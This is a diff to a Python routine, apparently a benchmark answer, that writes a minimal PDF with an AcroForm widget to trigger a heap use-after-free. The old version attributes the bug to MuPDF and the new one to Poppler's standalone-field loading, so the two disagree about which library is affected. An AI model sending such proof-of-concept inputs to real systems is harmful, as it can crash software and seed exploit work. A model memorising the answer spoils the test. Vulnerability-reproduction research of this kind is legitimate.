@@ -1,56 +1,53 @@
-import io
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in MuPDF.
-        The vulnerability (OSS-Fuzz 21604 / arvo:21604) exists in the destruction of form widgets
-        where the reference count of the dictionary object is not correctly incremented
-        during creation, leading to a double free (UAF) upon destruction.
-        """
-        # Construct a minimal valid PDF with a Form Widget (AcroForm)
+        # Construct a PDF file that triggers a Heap Use-After-Free vulnerability
+        # in Poppler's handling of standalone form fields (AcroForm fields not in Page Annots).
+        # Vulnerability: Page::loadStandaloneFields incorrectly manages reference counts for Dicts.
         
-        # PDF Objects content
-        objects = [
-            # 1. Catalog
-            b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>",
-            # 2. Pages
-            b"<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>",
-            # 3. Page (Points to the Annot)
-            b"<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 200 200 ] /Annots [ 5 0 R ] >>",
-            # 4. AcroForm (Points to the Field)
-            b"<< /Fields [ 5 0 R ] >>",
-            # 5. Widget Annotation (The vulnerable object structure)
-            b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (Pwn) /Rect [ 10 10 100 50 ] >>"
-        ]
-
-        writer = io.BytesIO()
-        writer.write(b"%PDF-1.7\n")
+        # PDF Header with binary marker
+        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
         
-        # Write objects and track offsets for XREF
+        # Object 1: Catalog
+        # Must refer to AcroForm to trigger form loading
+        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>\nendobj\n"
+        
+        # Object 2: Pages node
+        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
+        
+        # Object 3: Page
+        # IMPORTANT: This page has no /Annots entry.
+        # This forces the parser to treat the field in AcroForm as "standalone" and 
+        # execute the vulnerable Page::loadStandaloneFields path.
+        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
+        
+        # Object 4: AcroForm
+        # Contains the Fields array pointing to our widget
+        obj4 = b"4 0 obj\n<< /Fields [5 0 R] >>\nendobj\n"
+        
+        # Object 5: Widget Annotation (The Field)
+        # This Dict will be wrapped in an Object with insufficient refcount in the vulnerable code
+        obj5 = b"5 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /T (Vuln) /Rect [0 0 100 100] >>\nendobj\n"
+        
+        objects = [obj1, obj2, obj3, obj4, obj5]
+        body = b"".join(objects)
+        
+        # Calculate byte offsets for XREF table
         offsets = []
-        for i, content in enumerate(objects):
-            obj_id = i + 1
-            offsets.append(writer.tell())
-            writer.write(f"{obj_id} 0 obj\n".encode())
-            writer.write(content)
-            writer.write(b"\nendobj\n")
+        current_pos = len(header)
+        for obj in objects:
+            offsets.append(current_pos)
+            current_pos += len(obj)
             
-        # Write XREF table
-        xref_offset = writer.tell()
-        writer.write(b"xref\n")
-        writer.write(f"0 {len(objects) + 1}\n".encode())
-        # First entry (special)
-        writer.write(b"0000000000 65535 f \n")
-        # Object entries
+        # XREF Table
+        # 0 6 means entries 0 to 5
+        xref = b"xref\n0 6\n0000000000 65535 f \n"
         for offset in offsets:
-            writer.write(f"{offset:010} 00000 n \n".encode())
+            # Each entry is exactly 20 bytes: 10 digit offset, space, 5 digit gen, space, n, space, nl
+            xref += "{:010d} 00000 n \n".format(offset).encode('ascii')
             
-        # Write Trailer
-        writer.write(b"trailer\n")
-        writer.write(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode())
-        writer.write(b"startxref\n")
-        writer.write(f"{xref_offset}\n".encode())
-        writer.write(b"%%EOF")
+        # Trailer
+        trailer = "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n".format(current_pos).encode('ascii')
         
-        return writer.getvalue()
+        return header + body + xref + trailer
